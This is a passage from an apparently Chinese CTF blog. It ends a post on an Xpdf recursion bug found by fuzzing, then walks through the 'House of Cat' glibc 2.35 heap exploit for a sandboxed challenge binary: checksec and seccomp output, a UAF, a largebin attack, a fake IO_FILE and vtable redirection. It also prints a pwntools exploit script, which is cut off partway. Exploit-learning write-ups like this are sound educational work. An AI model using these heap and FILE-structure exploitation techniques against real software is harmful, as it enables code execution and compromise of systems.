</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (allowStreams &amp;&amp; buf2.isCmd(<span class="string">&quot;stream&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((str = makeStream(obj, fileKey, encAlgorithm, keyLength,</span><br><span class="line">   objNum, objGen))) <span class="comment">/* 正常调用makeStream */</span></span><br></pre></td></tr></table></figure>
<p>从整个调用链来看，程序的运行逻辑就是闭合的，可能作者需要这种递归调用来完成一些工作，盲猜作者在涉及调用条件时出现了一些问题：</p>
<ul>
<li><code>Parser::makeStream -&gt; Object::dictLookup</code> 和 <code>Object::dictLookup -&gt; XRef::fetch</code> 都是无条件调用，这里应该不会出现问题</li>
<li><code>XRef::fetch</code> 中调用了4次 <code>getObj</code>，<code>Parser::getObj</code> 中通过多次调用 <code>dictAdd</code> 来调用 <code>getObj</code>，但它们的调用都是有条件的，如果某一次的传入的 <code>Object</code> 结构体设置不对，就可能导致无限调用</li>
</ul>
<p>下载 4.02 版本代码，对比 <code>Parser.cc</code>，可以看到此漏洞被修复：</p>
<img src="/2022/08/14/Fuzz%20Lab1-Xpdf/2308014-20210907124158811-1900620626.png" class title="2308014-20210907124158811-1900620626"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/08/House%20Of%20Cat-2.35-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/08/House%20Of%20Cat-2.35-64/" class="post-title-link" itemprop="url">House Of Cat-2.35-64</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-08 14:52:02 / Modified: 14:53:21" itemprop="dateCreated datePublished" datetime="2022-08-08T14:52:02+08:00">2022-08-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>houseofcat 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3)</span> stable release version 2.35</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">3</span>aaf66e8616ac46ea3a3708792d4361a6c5b94c6, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped        </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/桌面/easychain1/pwn/rootfs/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  houseofcat patchelf ./house_of_cat --<span class="built_in">set</span>-interpreter ./ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>  --replace-needed libc.so<span class="number">.6</span> ./libc.so<span class="number">.6</span> --output house_of_cat1 </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> debug-file-directory /home/yhellow/tools/debuglibc/<span class="number">2.35</span><span class="number">-0u</span>buntu3_amd64/usr/lib/debug/</span><br><span class="line">pwndbg&gt; show debug-file-directory </span><br><span class="line">The directory where separate debug symbols are searched <span class="keyword">for</span> is <span class="string">&quot;/home/yhellow/tools/debuglibc/2.35-0ubuntu3_amd64/usr/lib/debug/&quot;</span>.</span><br></pre></td></tr></table></figure>
<p>有沙盒：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  houseofcat seccomp-tools dump ./house_of_cat1            </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x10</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0018</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0018</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x0b</span> <span class="number">0x00</span> <span class="number">0x0000013e</span>  <span class="keyword">if</span> (A == getrandom) <span class="keyword">goto</span> <span class="number">0017</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x0a</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0017</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0017</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0017</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0017</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0017</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0016</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = fd &gt;&gt; <span class="number">32</span> <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0018</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x02</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0017</span> <span class="keyword">else</span> <span class="keyword">goto</span> <span class="number">0018</span></span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != write) <span class="keyword">goto</span> <span class="number">0018</span></span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>白名单：getrandom，open，close，mmap，brk，exit_group</li>
<li>read 使用的 FD 只能为 “0”</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 index; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  output(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  index = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)input_num();</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> || !(&amp;chunk_list)[index] )</span><br><span class="line">    <span class="keyword">return</span> output(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">  output(<span class="string">&quot;Context:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, (&amp;chunk_list)[index], <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有 UAF</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">output(<span class="string">&quot;Welcome to CatF1y&#x27;s shop!!\n&quot;</span>);</span><br><span class="line">output(<span class="string">&quot;You can find your cat there\n&quot;</span>);</span><br><span class="line">libc_addr = &amp;write + <span class="number">0x20935</span>; <span class="comment">/* mp_+104 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x558f614e7160</span> —▸ <span class="number">0x7f04f249e3c8</span> (mp_+<span class="number">104</span>) ◂— <span class="number">0x40</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_k</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = key;</span><br><span class="line">  *libc_addr = key;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以修改 <code>mp_</code> 为 0x40</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>在 libc-2.34 中删除了：</p>
<ul>
<li>__free_hook</li>
<li>__malloc_hook</li>
<li>__realloc_hook</li>
<li>__memalign_hook</li>
<li>__after_morecore_hook</li>
</ul>
<p>在 libc-2.34 的早期版本中（glibc-2.34-0ubuntu3_amd64 以及之前），vtable 可写，但在 glibc-2.34-0ubuntu3.2_amd64 中 vtable 不可写</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p /x &amp;_IO_2_1_stdout_ </span><br><span class="line">$<span class="number">1</span> = <span class="number">0x7f33cb29a780</span></span><br><span class="line">pwndbg&gt; x/xg <span class="number">0x7f33cb29a780</span>+<span class="number">0xd8</span></span><br><span class="line"><span class="number">0x7f33cb29a858</span> &lt;_IO_2_1_stdout_+<span class="number">216</span>&gt;:	<span class="number">0x00007f33cb296600</span></span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x00007f33cb296600</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x7f33cb295000</span>     <span class="number">0x7f33cb299000</span> r--p     <span class="number">4000</span> <span class="number">214000</span> /home/yhellow/桌面/houseofcat/libc.so<span class="number">.6</span> +<span class="number">0x1600</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因为题目限制了 edit 的次数，导致 House Of Emma 不起作用</p>
<ul>
<li>House Of Emma 需要3次 edit：<ul>
<li>构造 largebin attack 攻击 <code>stderr</code> 中的 FILE 结构体</li>
<li>构造 largebin attack 攻击 <code>__pointer_chk_guard_local</code></li>
<li>修改 top chunk-&gt;size 以触发 <code>sysmalloc</code> 中的 <code>__malloc_assert</code></li>
</ul>
</li>
</ul>
<p>这时就需要 House Of Emma 中 vtable 偏移的思想，通过修改虚表指针的偏移，转而调用 <code>_IO_wfile_jumps</code> 中的 <code>_IO_wfile_seekoff</code> 函数，然后进入到 <code>_IO_switch_to_wget_mode</code> 函数中来攻击</p>
<p>进行 largebin attack，把 <code>stderr</code> 中的 <code>_IO_2_1_stderr_</code> 覆盖为可控制的 heap 地址</p>
<p>然后注入一些的 fake_IO_FILE：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0xffff</span>)  <span class="comment"># rax1 </span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xc18</span>-<span class="number">0x68</span>)  <span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)  <span class="comment">#call addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xb30</span>)  <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2</span></span><br></pre></td></tr></table></figure>
<p>因为沙盒中限制了 read 的 FD，所以在调用 ORW 前需要先 <code>close(0)</code>，使 <code>open(&quot;./flag&quot;)</code> 的文件描述符生成在 <code>“0”</code> 处</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;set debug-file-directory /home/yhellow/tools/debuglibc/2.35-0ubuntu3_amd64/usr/lib/debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./house_of_cat1&quot;</span>)</span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./house_of_cat1&#x27;, cmd)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./house_of_cat1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inpwn</span>():</span></span><br><span class="line">    payload = <span class="string">&quot;LOGIN | r00t QWBQWXF admin&quot;</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,payload)</span><br><span class="line">    payload = <span class="string">&quot;CAT | r00t QWBQWXF &quot;</span>+<span class="string">&quot;\xff&quot;</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">num</span>):</span></span><br><span class="line">    inpwn()</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content=<span class="string">&quot;\x00&quot;</span></span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x430</span>,<span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>,<span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&#x27;ddd&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x21a0d0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">10</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_pop_r12_ret=libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">ret=libc_base+<span class="number">0x0000000000029cd6</span></span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_ret=libc_base+libc.search(asm(<span class="string">&#x27;syscall\nret&#x27;</span>)).<span class="built_in">next</span>()</span><br><span class="line">stderr=libc_base+libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line"></span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">close=libc_base+libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">read=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake IO</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0xffff</span>)  <span class="comment"># rax1 </span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xc18</span>-<span class="number">0x68</span>)  <span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)  <span class="comment">#call addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xb30</span>)  <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># 